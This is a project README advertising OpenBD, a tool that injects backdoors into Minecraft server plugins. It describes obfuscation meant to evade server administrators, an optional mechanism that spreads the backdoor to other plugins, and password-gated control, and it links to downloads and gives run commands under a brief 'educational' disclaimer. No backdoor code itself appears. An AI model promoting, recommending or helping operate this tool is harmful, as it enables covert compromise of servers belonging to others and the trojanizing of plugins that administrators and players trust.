<div align="center">

# OpenBD: Open-Source Minecraft Plugin Backdoor Injector

<img alt="OpenBD Icon" src="icon.png" height="200" width="200"/>

</div>

<div align="center">
    <a href="https://github.com/tmquan2508/OpenBD/issues"><img alt="Open issues" src="https://img.shields.io/github/issues-raw/tmquan2508/OpenBD"/></a>
    <a href="https://github.com/tmquan2508/OpenBD/releases/latest"><img alt="GitHub downloads" src="https://img.shields.io/github/downloads/tmquan2508/OpenBD/total"></a>
    <img alt="Code size" src="https://img.shields.io/github/languages/code-size/tmquan2508/OpenBD"/>
</div>

<div align="center">
    <br>
    <a href="https://github.com/tmquan2508/OpenBD/releases/latest">
        <img alt="Download" src="https://img.shields.io/badge/-DOWNLOAD_LATEST_RELEASE-blue?style=for-the-badge"/>
    </a>
</div>

<br>

**OpenBD** is a modern and powerful universal backdoor injector for Minecraft server plugins. It is designed to be compatible with any Bukkit, Spigot, or Paper-based plugin, integrating seamlessly without requiring modification of the backdoor code for each target.

Its core strengths lie in a sophisticated camouflage engine that makes detection difficult without specialized knowledge or tools.

> **Disclaimer:** OpenBD was developed for educational purposes and to test the security of Minecraft servers. The author, tmquan2508, is not responsible for any misuse of this tool.

---

## ✨ Key Features

-   **Universal Compatibility:** Works with all Spigot, Paper, and Bukkit plugin JARs.
-   **Advanced Camouflage Engine:** Employs sophisticated techniques to obfuscate the backdoor and evade detection by server administrators.
-   **Spreading Mechanism:** Includes an optional feature to spread the backdoor to other plugins on the server.
-   **JSON Configuration:** Easily configure all features, including authorized users, command prefixes, and passwords, through a simple `config.json` file.

## 🚀 Getting Started

Follow these steps to get OpenBD up and running.

### Prerequisites

-   **Java 16** or higher must be installed on your system.

### 1. Download

Download the latest `OpenBD-X.X.X.jar` from the **[Releases Page](https://github.com/tmquan2508/OpenBD/releases/latest)**.

### 2. Run from the Command Line

Open a terminal or command prompt in the directory where you downloaded the JAR file. You can run the tool using the following command:

```sh
java -jar OpenBD-X.X.X.jar
```

To view the list of available commands and flags, use the `-h` or `--help` flag:

```sh
java -jar OpenBD-X.X.X.jar --help
```

> **Important Note**
> Remember to replace `OpenBD-X.X.X.jar` with the actual filename you downloaded (e.g., `OpenBD-1.0.0.jar`).

## 📖 Full Usage Guide

For detailed instructions on generating a configuration file, injecting backdoors, and a full list of commands and examples, please read the **[USAGE.md](docs/USAGE.md)** file.

## Full features: 
**[FEATURES.md](docs/FEATURES.md)**